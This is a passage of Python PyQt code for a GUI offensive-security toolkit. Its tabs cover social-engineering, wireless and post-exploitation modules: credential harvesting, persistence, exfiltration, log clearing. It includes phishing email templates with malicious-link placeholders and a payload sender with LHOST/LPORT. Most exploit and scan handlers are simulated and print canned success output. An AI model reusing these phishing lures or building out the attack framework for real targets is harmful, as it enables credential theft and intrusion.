        results_layout.addWidget(self.social_results)
        results_layout.addWidget(QLabel("Captured Credentials:"))
        results_layout.addWidget(self.credential_log)
        results_group.setLayout(results_layout)
        
        # Control buttons
        control_layout = QHBoxLayout()
        
        self.social_start_btn = QPushButton("Start Attack")
        self.social_start_btn.clicked.connect(self.start_social_attack)
        
        self.social_stop_btn = QPushButton("Stop")
        self.social_stop_btn.clicked.connect(self.stop_social_attack)
        self.social_stop_btn.setEnabled(False)
        
        control_layout.addWidget(self.social_start_btn)
        control_layout.addWidget(self.social_stop_btn)
        
        # Add widgets to right layout
        right_layout.addWidget(self.social_target_group)
        right_layout.addWidget(self.social_options_group)
        right_layout.addWidget(self.template_group)
        right_layout.addWidget(results_group)
        right_layout.addLayout(control_layout)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Select first attack by default
        if self.social_attack_list.count() > 0:
            self.social_attack_list.setCurrentRow(0)
        
        return tab
    
    def create_wireless_tab(self):
        """Create the Wireless Exploits tab"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Splitter for attack selection and details
        splitter = QSplitter(Qt.Orientation.Horizontal if PYQT6_AVAILABLE else Qt.Horizontal)
        
        # Left panel - Attack selection
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Interface selection
        interface_group = QGroupBox("Wireless Interface")
        interface_layout = QVBoxLayout()
        
        self.wireless_interfaces = QComboBox()
        self.wireless_interfaces.addItems(["wlan0", "wlan1", "mon0", "wlan0mon"])
        
        self.refresh_interfaces = QPushButton("Refresh")
        self.refresh_interfaces.clicked.connect(self.refresh_wireless_interfaces)
        
        interface_layout.addWidget(QLabel("Select Interface:"))
        interface_layout.addWidget(self.wireless_interfaces)
        interface_layout.addWidget(self.refresh_interfaces)
        interface_group.setLayout(interface_layout)
        
        # Attack selection
        attack_group = QGroupBox("Wireless Attacks")
        attack_layout = QVBoxLayout()
        
        self.wireless_attack_list = QListWidget()
        self.wireless_attack_list.addItems(self.wireless_attacks)
        self.wireless_attack_list.currentItemChanged.connect(self.on_wireless_attack_selected)
        
        attack_layout.addWidget(QLabel("Select Attack:"))
        attack_layout.addWidget(self.wireless_attack_list)
        attack_group.setLayout(attack_layout)
        
        left_layout.addWidget(interface_group)
        left_layout.addWidget(attack_group)
        
        # Right panel - Attack configuration and results
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Target configuration
        self.wireless_target_group = QGroupBox("Target Configuration")
        self.wireless_target_layout = QFormLayout()
        self.wireless_target_group.setLayout(self.wireless_target_layout)
        
        # Attack specific options
        self.wireless_options_group = QGroupBox("Attack Options")
        self.wireless_options_layout = QVBoxLayout()
        self.wireless_options_group.setLayout(self.wireless_options_layout)
        
        # Results area
        results_group = QGroupBox("Attack Results")
        results_layout = QVBoxLayout()
        
        # Packet capture view
        self.packet_view = QTextEdit()
        self.packet_view.setReadOnly(True)
        self.packet_view.setMaximumHeight(150)
        self.packet_view.setStyleSheet("font-family: 'Courier New'; font-size: 10pt;")
        
        # Results log
        self.wireless_results = QTextEdit()
        self.wireless_results.setReadOnly(True)
        self.wireless_results.append("Select a wireless attack from the list to begin.")
        
        # Client table
        self.client_table = QTableWidget(0, 5)
        self.client_table.setHorizontalHeaderLabels(["MAC", "Vendor", "Signal", "Packets", "Last Seen"])
        header = self.client_table.horizontalHeader()
        if hasattr(QHeaderView, 'ResizeMode'):  # PyQt6
            header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        else:  # PyQt5
            header.setSectionResizeMode(QHeaderView.Stretch)
        self.client_table.setMaximumHeight(200)
        
        results_layout.addWidget(QLabel("Packet Capture:"))
        results_layout.addWidget(self.packet_view)
        results_layout.addWidget(QLabel("Clients:"))
        results_layout.addWidget(self.client_table)
        results_layout.addWidget(QLabel("Log:"))
        results_layout.addWidget(self.wireless_results)
        results_group.setLayout(results_layout)
        
        # Control buttons
        control_layout = QHBoxLayout()
        
        self.wireless_scan_btn = QPushButton("Scan")
        self.wireless_scan_btn.clicked.connect(self.start_wireless_scan)
        
        self.wireless_attack_btn = QPushButton("Start Attack")
        self.wireless_attack_btn.clicked.connect(self.start_wireless_attack)
        self.wireless_attack_btn.setEnabled(False)
        
        self.wireless_stop_btn = QPushButton("Stop")
        self.wireless_stop_btn.clicked.connect(self.stop_wireless_attack)
        self.wireless_stop_btn.setEnabled(False)
        
        control_layout.addWidget(self.wireless_scan_btn)
        control_layout.addWidget(self.wireless_attack_btn)
        control_layout.addWidget(self.wireless_stop_btn)
        
        # Add widgets to right layout
        right_layout.addWidget(self.wireless_target_group)
        right_layout.addWidget(self.wireless_options_group)
        right_layout.addWidget(results_group)
        right_layout.addLayout(control_layout)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Select first attack by default
        if self.wireless_attack_list.count() > 0:
            self.wireless_attack_list.setCurrentRow(0)
        
        return tab
    
    def create_post_tab(self):
        """Create the Post-Exploitation tab"""
        tab = QWidget()
        main_layout = QVBoxLayout(tab)
        main_layout.setContentsMargins(10, 10, 10, 10)
        
        # Splitter for modules and details
        splitter = QSplitter(Qt.Orientation.Horizontal if PYQT6_AVAILABLE else Qt.Horizontal)
        
        # Left panel - Module selection
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Target configuration
        target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.post_target = QLineEdit()
        self.post_target.setPlaceholderText("IP or Hostname")
        
        self.post_port = QSpinBox()
        self.post_port.setRange(1, 65535)
        self.post_port.setValue(22)
        
        self.post_username = QLineEdit()
        self.post_username.setPlaceholderText("Username")
        
        self.post_password = QLineEdit()
        if hasattr(QLineEdit, 'EchoMode'):  # PyQt6
            self.post_password.setEchoMode(QLineEdit.EchoMode.Password)
        else:  # PyQt5
            self.post_password.setEchoMode(QLineEdit.Password)
            
        self.post_key = QLineEdit()
        self.post_key.setPlaceholderText("SSH Key Path (optional)")
            
        target_layout.addRow("Target:", self.post_target)
        target_layout.addRow("Port:", self.post_port)
        target_layout.addRow("Username:", self.post_username)
        target_layout.addRow("Password:", self.post_password)
        target_layout.addRow("SSH Key:", self.post_key)
        target_group.setLayout(target_layout)
        
        # Module selection
        module_group = QGroupBox("Post-Exploitation Modules")
        module_layout = QVBoxLayout()
        
        self.post_modules = QListWidget()
        self.post_modules.addItems([
            "Privilege Escalation",
            "Lateral Movement",
            "Credential Harvesting",
            "Persistence",
            "Data Exfiltration",
            "Network Pivoting",
            "Log Manipulation",
            "Defense Evasion"
        ])
        self.post_modules.currentItemChanged.connect(self.on_post_module_selected)
        
        module_layout.addWidget(self.post_modules)
        module_group.setLayout(module_layout)
        
        # Add widgets to left panel
        left_layout.addWidget(target_group)
        left_layout.addWidget(module_group)
        
        # Right panel - Module options and results
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        # Module options
        self.post_options_group = QGroupBox("Module Options")
        self.post_options_layout = QVBoxLayout()
        self.post_options_group.setLayout(self.post_options_layout)
        
        # Results area
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        
        # Command output
        self.post_output = QTextEdit()
        self.post_output.setReadOnly(True)
        self.post_output.setStyleSheet("font-family: 'Courier New'; font-size: 10pt;")
        self.post_output.append("Select a post-exploitation module from the list to begin.")
        
        # File browser
        self.post_file_browser = QTreeView()
        self.post_file_model = QFileSystemModel()
        self.post_file_model.setRootPath("/")
        self.post_file_browser.setModel(self.post_file_model)
        self.post_file_browser.setRootIndex(self.post_file_model.index("/"))
        self.post_file_browser.setMaximumHeight(200)
        
        # Credential table
        self.post_creds_table = QTableWidget(0, 4)
        self.post_creds_table.setHorizontalHeaderLabels(["Username", "Password", "Source", "Notes"])
        header = self.post_creds_table.horizontalHeader()
        if hasattr(QHeaderView, 'ResizeMode'):  # PyQt6
            header.setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        else:  # PyQt5
            header.setSectionResizeMode(QHeaderView.Stretch)
        self.post_creds_table.setMaximumHeight(200)
        
        # Results tabs
        results_tabs = QTabWidget()
        
        output_tab = QWidget()
        output_layout = QVBoxLayout(output_tab)
        output_layout.addWidget(self.post_output)
        
        files_tab = QWidget()
        files_layout = QVBoxLayout(files_tab)
        files_layout.addWidget(self.post_file_browser)
        
        creds_tab = QWidget()
        creds_layout = QVBoxLayout(creds_tab)
        creds_layout.addWidget(self.post_creds_table)
        
        results_tabs.addTab(output_tab, "Output")
        results_tabs.addTab(files_tab, "File Browser")
        results_tabs.addTab(creds_tab, "Credentials")
        
        results_layout.addWidget(results_tabs)
        results_group.setLayout(results_layout)
        
        # Control buttons
        control_layout = QHBoxLayout()
        
        self.post_execute_btn = QPushButton("Execute")
        self.post_execute_btn.clicked.connect(self.execute_post_module)
        
        self.post_stop_btn = QPushButton("Stop")
        self.post_stop_btn.clicked.connect(self.stop_post_module)
        self.post_stop_btn.setEnabled(False)
        
        self.post_clear_btn = QPushButton("Clear")
        self.post_clear_btn.clicked.connect(self.clear_post_output)
        
        control_layout.addWidget(self.post_execute_btn)
        control_layout.addWidget(self.post_stop_btn)
        control_layout.addWidget(self.post_clear_btn)
        
        # Add widgets to right layout
        right_layout.addWidget(self.post_options_group)
        right_layout.addWidget(results_group)
        right_layout.addLayout(control_layout)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Select first module by default
        if self.post_modules.count() > 0:
            self.post_modules.setCurrentRow(0)
        
        return tab

# ===== EVENT HANDLERS =====
    def toggle_delivery_method(self, method):
        """Toggle visibility of delivery method options based on selection"""
        is_http = method == "HTTP Request"
        self.target_url.setVisible(is_http)
        self.http_method.setVisible(is_http)
        self.http_params.setVisible(is_http)
    
    def on_exploit_selected(self, current, previous):
        """Handle web exploit selection change"""
        if not current:
            return
            
        exploit_name = current.text()
        self.exploit_output.clear()
        self.exploit_output.append(f"[+] Selected exploit: {exploit_name}")
        self.exploit_output.append("Configure the options and click 'Execute' to run the exploit.")
        self.exploit_output.append("-" * 80)
        
        # Clear previous options
        self.clear_options()
        
        # Add exploit-specific options
        if "SQL" in exploit_name:
            self.add_sql_options()
        elif "XSS" in exploit_name:
            self.add_xss_options()
        elif "Command Injection" in exploit_name:
            self.add_command_injection_options()
        elif "File Inclusion" in exploit_name:
            self.add_file_inclusion_options()
        elif "SSRF" in exploit_name:
            self.add_ssrf_options()
        elif "XXE" in exploit_name:
            self.add_xxe_options()
        elif "Deserialization" in exploit_name:
            self.add_deserialization_options()
    
    def on_network_exploit_selected(self, current, previous):
        """Handle network exploit selection change"""
        if not current:
            return
            
        # Clear previous options
        self.clear_network_options()
        
        # Add exploit-specific options
        exploit_name = current.text()
        
        self.network_results.clear()
        self.network_results.append(f"[+] Selected exploit: {exploit_name}")
        self.network_results.append("Configure the target and options, then click 'Scan' or 'Exploit'.")
        
        if "Port Scanner" in exploit_name:
            self.add_port_scanner_options()
        elif "Service Fingerprinting" in exploit_name:
            self.add_fingerprinting_options()
        elif "Man-in-the-Middle" in exploit_name:
            self.add_mitm_options()
        elif "ARP Spoofing" in exploit_name:
            self.add_arp_spoofing_options()
        elif "DNS Spoofing" in exploit_name:
            self.add_dns_spoofing_options()
        elif "SMB" in exploit_name:
            self.add_smb_options()
        elif "RDP" in exploit_name:
            self.add_rdp_options()
    
    def on_binary_exploit_selected(self, current, previous):
        """Handle binary exploit selection change"""
        if not current:
            return
            
        # Clear previous options
        self.clear_binary_options()
        
        # Add exploit-specific options
        exploit_name = current.text()
        
        self.binary_results.clear()
        self.binary_results.append(f"[+] Selected exploit: {exploit_name}")
        self.binary_results.append("Configure the target and options, then click 'Analyze' or 'Exploit'.")
        
        if "Buffer Overflow" in exploit_name:
            self.add_buffer_overflow_options()
        elif "Format String" in exploit_name:
            self.add_format_string_options()
        elif "ROP" in exploit_name:
            self.add_rop_options()
        elif "Shellcode" in exploit_name:
            self.add_shellcode_options()
        elif "ASLR" in exploit_name and "DEP" not in exploit_name:
            self.add_aslr_options()
        elif "DEP" in exploit_name:
            self.add_dep_options()
        elif "Use-After-Free" in exploit_name:
            self.add_uaf_options()
        elif "Heap" in exploit_name:
            self.add_heap_options()
        elif "Integer" in exploit_name:
            self.add_integer_overflow_options()
        elif "Race" in exploit_name:
            self.add_race_condition_options()
    
    def on_social_attack_selected(self, current, previous):
        """Handle social engineering attack selection change"""
        if not current:
            return
            
        # Clear previous options
        if hasattr(self, 'social_options_layout'):
            while self.social_options_layout.count():
                item = self.social_options_layout.takeAt(0)
                if item.widget():
                    item.widget().deleteLater()
        
        # Clear output areas
        self.social_results.clear()
        self.credential_log.setRowCount(0)
        
        attack_name = current.text()
        self.social_results.append(f"[+] Selected attack: {attack_name}")
        self.social_results.append("Configure the options and click 'Start Attack' to begin.")
        
        form = QFormLayout()
        
        # Add attack-specific options
        if "Phishing" in attack_name:
            self.add_phishing_options()
        elif "Credential" in attack_name:
            self.add_credential_harvesting_options()
        elif "USB" in attack_name:
            self.add_malicious_usb_options()
        elif "QR" in attack_name:
            self.add_qr_attack_options()
        elif "Call" in attack_name:
            self.add_call_spoofing_options()
        elif "SMS" in attack_name:
            self.add_sms_phishing_options()
        elif "Social Media" in attack_name:
            self.add_social_media_options()
        elif "Physical" in attack_name:
            self.add_physical_access_options()
    
    def on_wireless_attack_selected(self, current, previous):
        """Handle wireless attack selection change"""
        if not current:
            return
            
        # Clear previous options
        if hasattr(self, 'wireless_options_layout'):
            while self.wireless_options_layout.count():
                item = self.wireless_options_layout.takeAt(0)
                if item.widget():
                    item.widget().deleteLater()
                    
        # Clear target configuration
        if hasattr(self, 'wireless_target_layout'):
            while self.wireless_target_layout.count():
                item = self.wireless_target_layout.takeAt(0)
                if item.widget():
                    item.widget().deleteLater()
        
        # Clear output areas
        self.wireless_results.clear()
        self.packet_view.clear()
        
        attack_name = current.text()
        
        self.wireless_results.append(f"[+] Selected attack: {attack_name}")
        self.wireless_results.append("Configure the options and click 'Start' to begin the attack.")
        self.wireless_results.append("-" * 80)
    
    def on_template_selected(self, current, previous):
        """Handle template selection change"""
        if not current:
            return
            
        # Clear the preview first
        self.template_preview.clear()
        
        template_name = current.text()
        if template_name == "Password Reset":
            self.template_preview.setPlainText(
                "Subject: Password Reset Required\n\n"
                "Dear User,\n\n"
                "We've detected suspicious activity on your account. For your security, please reset your password immediately.\n\n"
                "Click here to reset your password: [MALICIOUS_LINK]\n\n"
                "If you did not request this change, please contact support immediately.\n\n"
                "Best regards,\nIT Support"
            )
        elif template_name == "Account Verification":
            self.template_preview.setPlainText(
                "Subject: Verify Your Account\n\n"
                "Hello,\n\n"
                "Your account requires verification. Please click the link below to verify your account.\n\n"
                "Verify now: [MALICIOUS_LINK]\n\n"
                "This link will expire in 24 hours.\n\n"
                "Thanks,\nSupport Team"
            )
        elif template_name == "Document Share":
            self.template_preview.setPlainText(
                "Subject: Shared Document for Review\n\n"
                "Hello,\n\n"
                "I've shared an important document with you. Please review it at your earliest convenience.\n\n"
                "View document: [MALICIOUS_LINK]\n\n"
                "Best regards,\n[SPOOFED_SENDER]"
            )
        elif template_name == "Invoice":
            self.template_preview.setPlainText(
                "Subject: Invoice #INV-2023-12345\n\n"
                "Dear Valued Customer,\n\n"
                "Please find attached your invoice #INV-2023-12345.\n\n"
                "View your invoice: [MALICIOUS_LINK]\n\n"
                "If you have any questions, please contact our billing department.\n\n"
                "Sincerely,\nBilling Department"
            )
    
    def on_post_module_selected(self, current, previous):
        """Handle post-exploitation module selection"""
        if not current:
            return
                
        module_name = current.text()
            
        # Clear previous options
        if hasattr(self, 'post_options_layout'):
            while self.post_options_layout.count():
                item = self.post_options_layout.takeAt(0)
                if item.widget():
                    item.widget().deleteLater()
            
        # Create form layout for module options
        form_layout = QFormLayout()
            
        # Common fields for all modules
        self.module_timeout = QSpinBox()
        self.module_timeout.setRange(10, 3600)
        self.module_timeout.setValue(60)
        self.module_timeout.setSuffix(" seconds")
            
        # Add common fields
        form_layout.addRow("Timeout:", self.module_timeout)
            
        # Module-specific fields
        if module_name == "Privilege Escalation":
            self.pe_method = QComboBox()
            self.pe_method.addItems(["Kernel Exploits", "SUID/SGID Binaries", "Sudo Misconfiguration", "Cron Jobs", "NFS Misconfiguration"])
            form_layout.addRow("Method:", self.pe_method)
                
            self.pe_aggressive = QCheckBox("Aggressive Scan")
            form_layout.addRow("", self.pe_aggressive)
                
        elif module_name == "Lateral Movement":
            self.lm_target = QLineEdit()
            self.lm_target.setPlaceholderText("Target IP or hostname")
            form_layout.addRow("Target:", self.lm_target)
                
            self.lm_method = QComboBox()
            self.lm_method.addItems(["WMI", "PSExec", "SSH", "RDP", "SMB"])  # Removed dangerous options
            form_layout.addRow("Method:", self.lm_method)
                
        elif module_name == "Credential Harvesting":
            self.ch_type = QComboBox()
            self.ch_type.addItems(["Memory Dump", "Keyloggers", "Credential Files", "Browser Data"])
            form_layout.addRow("Harvest Type:", self.ch_type)
                
            self.ch_output = QLineEdit()
            self.ch_output.setPlaceholderText("Output file path")
            form_layout.addRow("Output File:", self.ch_output)
                
        elif module_name == "Persistence":
            self.persist_method = QComboBox()
            self.persist_method.addItems(["Registry", "Startup Folder", "Scheduled Task", "Service"])
            form_layout.addRow("Method:", self.persist_method)
                
            self.persist_interval = QSpinBox()
            self.persist_interval.setRange(1, 8760)  # Up to 1 year
            self.persist_interval.setValue(24)
            self.persist_interval.setSuffix(" hours")
            form_layout.addRow("Check-in Interval:", self.persist_interval)
        
        # Set the layout
        self.post_options_group.setLayout(form_layout)
        
        # Update the output with module description
        self.post_output.clear()
        descriptions = {
            "Privilege Escalation": "Attempt to elevate privileges on the target system.",
            "Lateral Movement": "Move laterally within the target network.",
            "Credential Harvesting": "Extract credentials and sensitive data from the target.",
            "Persistence": "Maintain access to the target system.",
            "Data Exfiltration": "Extract and exfiltrate data from the target.",
            "Network Pivoting": "Use the target as a pivot point to access other systems.",
            "Log Manipulation": "Modify or clear system logs.",
            "Defense Evasion": "Techniques to avoid detection by security controls."
        }
        self.post_output.append(f"[+] Selected Module: {module_name}")
        self.post_output.append(descriptions.get(module_name, "No description available."))
        self.post_output.append("-" * 80)
    
    # ===== FILTERING METHODS =====
    def filter_social_attacks(self, text):
        """Filter the list of social engineering attacks based on search text"""
        self.social_attack_list.clear()
        
        if not text:
            # If search is empty, show all attacks
            self.social_attack_list.addItems(self.all_social_attacks)
        else:
            # Filter attacks that contain the search text (case-insensitive)
            search_text = text.lower()
            filtered_attacks = [
                attack for attack in self.all_social_attacks 
                if search_text in attack.lower()
            ]
            self.social_attack_list.addItems(filtered_attacks)
            
        # Select the first item if the list is not empty
        if self.social_attack_list.count() > 0:
            self.social_attack_list.setCurrentRow(0)
    
    def filter_binary_exploits(self, text):
        """Filter the list of binary exploits based on search text"""
        self.binary_exploit_list.clear()
        
        if not text:
            # If search is empty, show all exploits
            self.binary_exploit_list.addItems(self.all_binary_exploits)
        else:
            # Filter exploits that contain the search text (case-insensitive)
            search_text = text.lower()
            filtered_exploits = [
                exploit for exploit in self.all_binary_exploits 
                if search_text in exploit.lower()
            ]
            self.binary_exploit_list.addItems(filtered_exploits)
            
        # Select the first item if the list is not empty
        if self.binary_exploit_list.count() > 0:
            self.binary_exploit_list.setCurrentRow(0)
    
    def filter_network_exploits(self, text):
        """Filter the list of network exploits based on search text"""
        self.network_exploit_list.clear()
        
        if not text:
            # If search is empty, show all exploits
            self.network_exploit_list.addItems(self.all_network_exploits)
        else:
            # Filter exploits that contain the search text (case-insensitive)
            search_text = text.lower()
            filtered_exploits = [
                exploit for exploit in self.all_network_exploits 
                if search_text in exploit.lower()
            ]
            self.network_exploit_list.addItems(filtered_exploits)
            
        # Select the first item if the list is not empty
        if self.network_exploit_list.count() > 0:
            self.network_exploit_list.setCurrentRow(0)
    
    # ===== UTILITY METHODS =====
    def clear_options(self):
        """Clear web exploit options"""
        # Remove all widgets from options layout
        while self.options_layout.count():
            item = self.options_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
    
    def clear_network_options(self):
        """Clear network exploit options"""
        # Remove all widgets from network options layout
        while self.network_options_layout.count():
            item = self.network_options_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
    
    def clear_binary_options(self):
        """Clear binary exploit options"""
        # Remove all widgets from binary options layout
        while self.binary_options_layout.count():
            item = self.binary_options_layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
    
    def clear_post_output(self):
        """Clear the post-exploitation output"""
        self.post_output.clear()
        self.post_creds_table.setRowCount(0)
    
    def get_current_module_name(self):
        """Get the name of the currently selected module"""
        current_item = self.post_modules.currentItem()
        if current_item:
            return current_item.text()
        return None
    
    def show_message(self, message, msg_type="info"):
        """Show a status message"""
        if msg_type == "error":
            QMessageBox.critical(self, "Error", message)
        elif msg_type == "success":
            QMessageBox.information(self, "Success", message)
        else:
            QMessageBox.information(self, "Information", message)
    
    def populate_network_interfaces(self):
        """Populate the network interfaces dropdown"""
        try:
            # This is a placeholder - in a real implementation, you would use a library
            # like netifaces to get the actual network interfaces
            interfaces = ["eth0", "wlan0", "en0", "en1"]
            
            for iface in interfaces:
                self.network_interface.addItem(iface)
        except Exception as e:
            self.network_results.append(f"[-] Error getting network interfaces: {str(e)}")
    
    def refresh_wireless_interfaces(self):
        """Scan for and update the list of available wireless interfaces"""
        try:
            self.wireless_interfaces.clear()
            
            # Common wireless interface names
            common_interfaces = ["wlan0", "wlan1", "wlan2", "wlp2s0", "wlp3s0", 
                                  "wlan0mon", "wlan1mon", "mon0", "mon1"]
            
            # Update the interface list in the GUI
            self.wireless_interfaces.addItems(common_interfaces)
            
            # Select the first interface if available
            if common_interfaces:
                self.wireless_interfaces.setCurrentIndex(0)
                
            # Log the update
            self.wireless_results.append("[+] Wireless interfaces refreshed")
                
        except Exception as e:
            self.wireless_results.append(f"[-] Error refreshing wireless interfaces: {str(e)}")
    
    def select_attachment(self):
        """Select file to attach to phishing email"""
        file_name, _ = QFileDialog.getOpenFileName(self, "Select Attachment", "", "All Files (*.*)")
        if file_name:
            self.phish_attachment.setText(file_name)

# ===== ACTION METHODS =====
    def generate_payload(self):
        """Generate the selected payload"""
        try:
            payload_type = self.payload_type.currentText()
            lhost = self.lhost.text().strip()
            lport = int(self.lport.text().strip())
            encoding = self.encoding.currentText()
            
            # Basic validation
            if not lhost:
                self.show_message("Error: LHOST cannot be empty", "error")
                return
                
            if lport < 1 or lport > 65535:
                self.show_message("Error: Invalid LPORT (1-65535)", "error")
                return
            
            # Disable button during generation
            self.generate_btn.setEnabled(False)
            
            # Start payload generation in a separate thread
            self.thread = PayloadGeneratorThread(payload_type, lhost, lport, encoding)
            self.thread.finished_signal.connect(self.on_payload_generated)
            self.thread.start()
            
        except ValueError as e:
            self.show_message(f"Error: {str(e)}", "error")
            self.generate_btn.setEnabled(True)
    
    def on_payload_generated(self, result):
        """Handle payload generation completion"""
        try:
            if result.get('success'):
                self.generated_payload = result['details'].get('payload', '')
                self.output.setPlainText(json.dumps(result['details'], indent=2))
                self.show_message("Payload generated successfully", "success")
                self.send_btn.setEnabled(True)
            else:
                self.output.setPlainText(f"Error: {result.get('error', 'Unknown error')}")
                self.show_message("Failed to generate payload", "error")
                self.send_btn.setEnabled(False)
        except Exception as e:
            self.show_message(f"Error processing payload: {str(e)}", "error")
            self.send_btn.setEnabled(False)
        finally:
            self.generate_btn.setEnabled(True)
    
    def send_payload(self):
        """Send the generated payload to the target"""
        if not hasattr(self, 'generated_payload') or not self.generated_payload:
            self.show_message("No payload generated yet", "error")
            return
            
        method = self.delivery_method.currentText()
        
        if method == "Manual Copy":
            clipboard = QApplication.clipboard()
            clipboard.setText(self.generated_payload)
            self.status_area.append("[*] Payload copied to clipboard")
            self.show_message("Payload copied to clipboard", "info")
            
        elif method == "HTTP Request":
            target_url = self.target_url.text().strip()
            if not target_url:
                self.show_message("Please enter a target URL", "error")
                return
                
            self.status_area.append(f"[+] Sending payload to {target_url}...")
            self.send_btn.setEnabled(False)
            
            # Start sender thread
            self.sender = PayloadSenderThread(
                target_url=target_url,
                method=self.http_method.currentText(),
                params=self.http_params.text(),
                payload=self.generated_payload
            )
            
            self.sender.status_signal.connect(self.update_status)
            self.sender.result_signal.connect(self.handle_send_result)
            self.sender.start()
    
    def update_status(self, message):
        """Update the status area with a message"""
        self.status_area.append(message)
        # Auto-scroll to bottom
        self.status_area.verticalScrollBar().setValue(
            self.status_area.verticalScrollBar().maximum()
        )
    
    def handle_send_result(self, result):
        """Handle the result of the send operation"""
        self.send_btn.setEnabled(True)
        
        if result.get('success'):
            self.status_area.append("[+] Payload sent successfully!")
            self.status_area.append("\nResponse headers:")
            for k, v in result.get('headers', {}).items():
                self.status_area.append(f"  {k}: {v}")
            self.status_area.append("\nResponse content:")
            self.status_area.append(result.get('response', 'No response'))
        else:
            self.status_area.append(f"[-] Failed to send payload: {result.get('error', 'Unknown error')}")
    
        self.status_area.append("" + "-"*50 + "\n")
    
    def test_exploit(self):
        """Test the selected web exploit"""
        current_item = self.exploit_list.currentItem()
        if not current_item:
            self.show_message("Please select an exploit first", "error")
            return
            
        exploit_name = current_item.text()
        target_url = self.target_url.text().strip()
        
        if not target_url:
            self.show_message("Please enter a target URL", "error")
            return
        
        self.results.clear()
        self.results.append(f"[+] Testing {exploit_name} on {target_url}")
        self.results.append("[*] This is a simulated test - no actual request is sent in this demo")
        self.results.append("[+] Test completed successfully")
        self.execute_btn.setEnabled(True)
    
    def execute_exploit(self):
        """Execute the selected exploit"""
        current_item = self.exploit_list.currentItem()
        if not current_item:
            self.show_message("Please select an exploit first", "error")
            return
            
        exploit_name = current_item.text()
        self.results.append(f"[+] Executing {exploit_name}...")
        
        # Simulate exploit execution
        # In a real implementation, this would contain the actual exploit code
        self.results.append("[*] Sending payload...")
        self.results.append("[*] Analyzing response...")
        self.results.append("[+] Exploit completed successfully!")
        self.results.append("")
        
        # Auto-scroll to bottom
        self.results.verticalScrollBar().setValue(self.results.verticalScrollBar().maximum())
    
    def scan_network(self):
        """Initiate network scan"""
        target = self.network_target.text().strip()
        ports = self.network_ports.text().strip()
        
        if not target:
            self.show_message("Please enter a target", "error")
            return
            
        if not ports:
            ports = "1-1024"  # Default port range
            
        self.network_results.append(f"[+] Starting scan on {target} ports {ports}")
        self.network_results.append("[*] This is a simulated scan - no actual packets are sent in this demo")
        self.network_results.append("[*] Scan completed. Found 5 open ports.")
        self.network_results.append("    22/tcp   ssh")
        self.network_results.append("    80/tcp   http")
        self.network_results.append("    443/tcp  https")
        self.network_results.append("    3306/tcp mysql")
        self.network_results.append("    8080/tcp http-proxy")
        
        self.network_exploit_btn.setEnabled(True)
    
    def execute_network_exploit(self):
        """Execute the selected network exploit"""
        current_item = self.network_exploit_list.currentItem()
        if not current_item:
            self.show_message("Please select an exploit first", "error")
            return
            
        exploit_name = current_item.text()
        target = self.network_target.text().strip()
        
        self.network_results.append(f"[+] Executing {exploit_name} on {target}...")
        self.network_results.append("[*] This is a simulated exploit - no actual packets are sent in this demo")
        self.network_results.append("[+] Exploit completed successfully")
    
    def analyze_binary(self):
        """Analyze the target binary"""
        target = self.binary_target.text().strip()
        if not target:
            self.show_message("Please specify a target binary or PID", "error")
            return
            
        self.binary_results.append(f"[+] Analyzing {target}...")
        self.binary_results.append("[*] This is a simulated analysis - no actual binary is analyzed in this demo")
        self.binary_results.append("[*] Architecture: x86-64")
        self.binary_results.append("[*] Security: NX enabled, ASLR enabled, PIE enabled")
        self.binary_results.append("[*] Vulnerable functions: strcpy, gets, printf")
        
        # Update disassembly view
        self.disasm_view.setPlainText(
            "0x400540:  push   rbp\n"
            "0x400541:  mov    rbp,rsp\n"
            "0x400544:  sub    rsp,0x40\n"
            "0x400548:  mov    DWORD PTR [rbp-0x34],edi\n"
            "0x40054b:  mov    QWORD PTR [rbp-0x40],rsi\n"
            "0x40054f:  mov    rax,QWORD PTR [rbp-0x40]\n"
            "0x400553:  add    rax,0x8\n"
            "0x400557:  mov    rdx,QWORD PTR [rax]\n"
            "0x40055a:  lea    rax,[rbp-0x30]\n"
            "0x40055e:  mov    rsi,rdx\n"
            "0x400561:  mov    rdi,rax\n"
            "0x400564:  call   0x400430 <strcpy@plt>"
        )
        
        # Update memory view
        self.memory_view.setPlainText(
            "0x7fffffffde00:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n"
            "0x7fffffffde10:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n"
            "0x7fffffffde20:  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n"
            "0x7fffffffde30:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................\n"
            "0x7fffffffde40:  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................"
        )
        
        self.binary_exploit_btn.setEnabled(True)
    
    def execute_binary_exploit(self):
        """Execute the selected binary exploit"""
        current_item = self.binary_exploit_list.currentItem()
        if not current_item:
            self.show_message("Please select an exploit first", "error")
            return
            
        exploit_name = current_item.text()
        target = self.binary_target.text().strip()
        
        self.binary_results.append(f"[+] Executing {exploit_name} on {target}...")
        self.binary_results.append("[*] This is a simulated exploit - no actual binary is exploited in this demo")
        
